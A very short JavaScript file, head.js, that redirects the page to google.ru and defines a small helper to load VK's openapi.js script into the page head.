// head.js

window.location = 'https://google.ru';

function include(el,url,to) {
        var element = document.createElement(el);
        element.src = url;
        document.getElementsByTagName(to)[0].appendChild(element);
    }
	
include('script','https://vk.com/js/api/openapi.js?168','head');  
